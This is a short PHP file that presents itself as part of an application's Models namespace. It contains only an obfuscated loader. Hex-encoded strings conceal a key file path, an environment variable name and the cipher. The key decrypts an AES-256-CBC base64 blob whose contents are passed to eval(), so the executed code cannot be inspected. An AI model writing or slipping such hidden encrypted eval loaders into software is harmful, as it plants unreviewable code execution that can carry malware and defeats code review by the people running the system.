<?php
namespace App\Models;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('tP9kB93aWI51/zVeO/oUsQ==');

$c=base64_decode(

'1JvexiiXHkeESyuOh/O1dHpNe7Ktl8SLSC3Hkt7fNUppgilm+pTNmCbGJ2frgW4cvj4liRBGF9JN' .
'l7LfYWRgWzvmNtOw0qgNJ2i7Fp2a7+LeUo0piVNtzxTpBzUV/fMMf3eYhCEgGWkXX6paf+E4pWhN' .
'LM96hGpRgNE606SBHGYhWom4MefO3pjwD1RQebd3Hsay64FPklKuESi8JfczUq8tw8o+IN77PLLI' .
'+IIvBdHXaYJu//2UZo2c9XquYoa5FkTN1pUu6N1PqxVmyNkxTVmBMndgF+5n7ygPHbiTF6wS5oCJ' .
'6WO4FItZyWmSV/ta+N62WlSoiTs8ayfBSV5hUbm+KEcHCbz43xBABe/ly8qm56URXAOcCLXwKn6D' .
'fyrG2scxlTZfg+JTjDDlSoGLojiER/Nq106nS3A+YaYVhPZxoNTk6r9MWNLoZDHjAJKNobs64qUt' .
'LXr/WO57ptd8xB7igtgpQiLLu0k1DkHnnD20Q3n/PXsbF8gz4itCsCP9EHEZkToly4vbhpHCjOWW' .
'U8XUByr6Y/lxMCg6TRTA0CUs8SI5I5dIwgpETXUSNyR1ISYHnHZwHp1i7qPdlKCIhET053LXDBN5' .
'/+G7fYYqLg2SrqE/vjCm5nu3O0UxIIB2En29YQuSvsd4GbtH7UZqtZhGgUQe9P8ODNrbqe+XSD7G' .
'mETIR32N2JQNwcmFUbyTK3UHmmp12b45L8WsIAvTxVfhxctf/ED6WZiBDOkrxL059rdh8PZIQ28B' .
'lTsAtmIMLeJUKBH0Co32DR+EnwtSfw=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

